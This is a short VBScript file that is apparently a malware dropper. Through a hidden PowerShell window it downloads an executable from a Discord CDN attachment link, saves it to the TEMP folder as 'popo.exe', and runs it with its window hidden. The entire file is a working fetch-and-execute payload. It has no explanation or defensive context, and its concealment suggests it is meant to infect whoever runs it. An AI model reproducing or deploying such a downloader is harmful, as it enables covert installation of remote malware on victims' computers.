Set WshShell = CreateObject("WScript.Shell")
strCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command " & _
    """$url = 'https://cdn.discordapp.com/attachments/1344411176443842676/1459868169459204321/PwS9viEbig.exe?ex=6964d7ae&is=6963862e&hm=8cde39cd0deb3fe5b13da6cd9d9e4c3cc5652e0ff7d20fda325c0e899fe1d52f&';" & _
    " $out = Join-Path $env:TEMP 'popo.exe';" & _
    " Invoke-WebRequest -Uri $url -OutFile $out;" & _
    " Start-Process -FilePath $out -WindowStyle Hidden"""
WshShell.Run strCmd, 0, False
